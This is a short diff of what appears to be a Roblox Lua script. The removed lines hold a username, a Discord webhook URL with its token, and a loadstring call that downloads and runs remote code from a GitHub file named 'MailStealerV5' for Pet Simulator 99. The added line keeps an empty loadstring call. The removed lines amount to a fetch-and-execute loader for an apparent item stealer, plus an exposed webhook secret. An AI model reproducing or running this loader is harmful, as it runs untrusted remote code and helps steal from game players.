@@ -1,6 +1,1 @@
-
-Username = "Soniczb1533"
-Username2 = "Soniczb1533"
-Webhook = "https://discord.com/api/webhooks/1289276708217946237/JrWqIiPBeHmEEjOklzga3mf0ZCiB26S_ChIvCDmwv6SVcKUuZf2V-z1ujjO3rdM43ED_"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/RenceeeX/PetSimulator99/main/MailStealerV5"))()
+loadstring(game:HttpGet(""))()
